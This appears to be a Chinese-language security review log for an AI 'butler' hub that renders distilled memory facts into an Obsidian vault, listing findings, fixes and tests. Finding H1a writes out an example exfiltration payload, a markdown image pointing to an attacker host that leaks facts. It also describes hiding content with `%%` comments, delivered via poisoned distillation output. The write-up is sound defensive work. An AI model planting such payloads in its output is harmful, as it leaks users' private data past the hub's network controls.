...
| C | 投影面 + capstone | M5 `ac3e297` / M7 `5e4538a` | 3H/5M/4L，11 修 4 记档 |
...
### 19.3 轮 C（投影面 + capstone）

**H1a 投影里的自由文本是一条出网面。** M5 的 §16.2 判断③写的是「frontmatter 里不放自由
文本」——那道门守住了 YAML，**正文一个字都没守**。而 Obsidian 的正文是会被渲染的：一条被
注入的蒸馏结果写成 `![](https://攻击者/pixel?d=<顺手带出去的事实>)`，成员一打开 vault，
**他自己那台机器**就把请求发出去了——绕开的不是 hub 的哪一道闸，是 hub 的**全部**出网边界
（那次请求根本不经过 hub）。同一条路上还有 `%%…%%`：Obsidian 的注释语法，在阅读视图里
**整段消失**，正好废掉投影存在的理由（「让人看得见记着什么」）。

修=新增 `mdSafe()` 作为**自由文本进正文的唯一通道**，`text()`／事实行／cluster 标题三处
全部改走它。两条规则：
- `\ [ ] < > `` ` ``` 一律加反斜杠。注意**转义保留字符本身**——`\`` 里仍有一个反引号、
  `\<img` 里仍有 `<img`，所以门断言的是**转义后的确切字节**（`toBe`），不是「不含某个字符」。
  写成后者的那条断言会在一个只删不转义的实现上一样绿。
- `%` 只在**左邻或右邻也是 `%`** 时才转义。这条规则自带证明：一个裸 `%` 被吐出来，当且仅当
  它两侧都不是 `%` ⇒ **输出里不可能出现两个相邻的裸 `%`**。第一版写的是「下一个是 `%` 才
  转义」，那会吐出 `\%%`（还是含 `%%`），并且漏掉 `%%%` 的尾巴——写门的时候撞出来的真 bug。

顺序也是承重的：`oneLine`（折行 + 按码点截断）→ `mdSafe`（中和）→ `linkify`（加**我们自己**
那些 `[[…]]`）。反过来会把框架自己生成的链接一起转义掉。

**H1b 指不准，就不指。** `buildKnowledgeLinkTable` 拿书架上的**文件名**去拼 `[[knowledge/x.md]]`，
而文件名里可以有 `[ ] | # ^` ——那正是 wikilink 语法自己的定界符，一个 `a]b.md` 拼出来的是
一条**断在半路**的链接，指向一篇并不存在的笔记（Obsidian 里点它 = 新建一篇本不该存在的）。
这里**不能靠转义**（转义后的链接指不到那个文件），只能**不指**：`LINK_HOSTILE` 命中就跳过
这一条，正文照出文件名，只是不带链——与 §16.2 判断②「链只指真实存在的文件」同一条纪律。

**H2 忘掉一条不重投，那条事实还在 vault 里摆最多 6 小时。** `forgetAll` 从第一版起就连投影
一起清，**单条 `forget` 漏了**——而「忘掉」这个动作的全部意义就是「别再让我看见它」。修=
`forget` 命中时调同一条重投路径；为此把 `projectButlerVault` 的记忆那一半抽成导出的
`projectButlerMemoryVault`，**6h 那趟与遗忘那条走同一份实现**（M5 §16.4 立过的规矩：两条
路要产出同样的字节，就得调同一个工厂）。投影失败只 warn——真相已经改了，一次派生物写不出
不该把一次成功的遗忘报成失败。

**H3a 这一条必须抛。** 本模块其余路径失败一律只 warn，因为投影是派生物、下一 tick 会自愈；
`removeMemoryProjections` 不一样：调用它的是「忘掉关于我的全部」，吞掉 `rm` 的失败 = 成员
收到一句「已经忘了」，而那份 md 与 jsonl 一样读得到。**一条被吞掉的删除失败，比一次响亮的
报错更接近撒谎。**（`rmdir` 那句仍 `.catch`：目录非空是**预期内**的——人自己往 `memory/`
里放过东西，不该把一次成功的遗忘变成错误。）

**M4 读窗读满时，「空掉的 cluster」是分不出来的。** 记忆投影按文件后端的 `LIST_MAX_LIMIT`
取最新 500 条（§16.6 已如实写着）。窗口一满，某个 cluster 一条都没读到有两种可能：真空了，
或者它的事实全落在窗口外——而旧实现会**删掉**那份投影。修=`windowed` 一路传进
`planMemoryProjections`：窗口不完整时，空 cluster **既不写也不删**（留着的那份至少是曾经
成立过的字节），活着的那些文件正文里加一句说明。**一份陈旧的投影，比一份被删掉的投影错得少。**

**M5 投影不需要模型。** 蒸馏要 `provider`，把盘上已有的真相渲染成 md 不要——而旧代码把整趟
维护挂在 `if (!provider) return` 后面：**没配 key 的 hub 一份 `tasks.md` 也拿不到**，而那两份
真相（`tasks.json` / `semantic.jsonl`）本来就在盘上；双时态还会让「什么算数」随时间变，没有
这一趟就永远停在最后一次有 key 的样子。修=`!provider` 分支先 `projectOnly(userIds)` 再返回。
这一条同时让 H3b/M7 那些「下一 tick 自愈」的说法**真的有下一 tick**。

**M6 `memory/` 是符号链接时，写和删都会穿出 vault。** `tasks.md` 不受影响（原子 rename 是
**替换**符号链接而不是跟着它走），但 `memory/<cluster>.md` 是先 `mkdir -p` 再逐个写、遗忘时
逐个 `rm` ——一条指向别处的 `memory/` 会让这两件事落在 vault 外面。修=写、删两条路各自
`lstat` 一次：写路径拒绝并 warn，删路径**抛错**（同 H3a 的理由：这条路上的沉默就是撒谎）。

**M8 repair 卡把两条批准路说成了一条。** 卡上原写「送进你的待办后 `/approve <短码>` 就能在
聊天窗批」，而 `IM_APPROVABLE_TOOLS` 是一份**列举**名单（九轮 H1 立的规矩），`hands_*` 五件
**刻意不在里面**——手机上照着卡做，`/approve` 会落 `not_found`。修=把「聊天窗能批的」
（改 hub 基础设置、建改助手与工作流）与「只能去网页批的」（工作区里的联网命令，那一行命令
原文要人逐字读过才算数）分成两句写清。卡量仍 10、字数仍在 500tk 门内（472tk）。

**M9 capstone 的两句话过头了。**「盘上零痕迹」不对：`classify` **刻意**会落一行
`stage:'classify'` 的审计——审批卡上那句「完整命令见审计台账」就靠它兑现。改成
「**工作区里一个字节没落**」，那才是 park 真正保证的事。另一处是 `skipped` 的会计：本机没有
OS 监狱时三幕的「真 spawn」那半按设计跳过，而收官只印「36 条断言全过」——**no silent caps**
同样适用于演示：跳过的段数现在会被数出来并印在收官行里。

**L10b / L12 两条小的。** 重复的 cluster id 是两份计划写同一个文件、后写的静默赢（目录配坏了
该看得见，不该表现成「那个 cluster 的事实少了一半」）⇒ 跳过并 warn。收起来的任务原样
`slice(0, 30)` 拿的是**最老的 30 条**，而下面那句写的是「还有 N 条更早的没有列出」——正好
说反 ⇒ 按 `updatedAt` 倒序取。

**核实后没照办的四条：**
- **M9 的 `gated()` 断言**：demo 里那个辅助函数确实只问了策略层，没真跑一遍 park。但
  `callTool` 在执行前**会再问一次策略**（M2 起就是这条纪律），`refuse` 于是被两处执行；
  真正的「park」属性住在管家的 governed 循环里，那是 `personal-butler-*` 的测试盖的面，
  不该让一个零依赖的 demo 去重建一台 hub 来复证。
- **H3b / M7 的两处竞态**（重投与 6h tick 撞车、写到一半崩）：有界残余——下一 tick 自愈，
  而 M5 那条修法恰好保证了这个 tick 在没有 key 的 hub 上也会发生。
- **L10a Windows 保留设备名**（`con` / `aux` 之类当 cluster id）：hub 跑在 Linux/macOS 上，
  为一个我们不支持的平台加一张名单是给门增重不增强。
- **L11 改名 tier 会留下孤儿文件**：`memory/<旧 id>.md` 不会自己消失。这是「文件名来自配置」
  的固有代价，清理属于人自己的 vault 维护动作，不该由投影层去猜哪些文件是它自己写的。

**门**：personal-butler `obsidian-projection.test.ts` **43**（+7：中和四类语法 + 链接敌意
文件名 + 窗口不完整不删 + 重复 id + 收起来的任务倒序 + 符号链接写拒绝/删抛错），host
`butler-obsidian-wiring.test.ts` **7**（+2：忘掉一条也重投 / 没有 provider 那趟照样投影，
后者驱动真 `ButlerMaintenanceSweeper`），`butler-guide.test.ts` **8**（+1：卡上两条批准路
分开且顺序正确，同时钉 `hands_run` 不在 `IM_APPROVABLE_TOOLS` 里）。**十一道变异十一次全红
且只红该红那些**（转义集摘掉 `[`/`<` / 百分号退回「看下一个字符」 / 链接敌意名不跳 / 窗口
不完整照删 / 去重复 id 守卫 / 收起来的任务不排序 / 写路径不查符号链接 / 遗忘路径重新吞异常 /
忘掉一条不重投 / 没 provider 不投影 / repair 卡退回旧措辞）；复原一律 python 精确替换 +
`shasum` 对拍，**绝不 `git checkout <file>`**。**demo 的跳过会计没有自动门**——它只在没有
OS 监狱的机器上才有输出，本机跑不出那条路径，如实记在这里。

**验收**：personal-butler **229**、host **3155**+5skip、全仓 `pnpm -r typecheck` 净、四门 PASS
（**旋钮 116 零新增**；main.ts 2807/2810）、`pnpm demo:atong-hands` exit 0（36 条断言，0 跳过）。
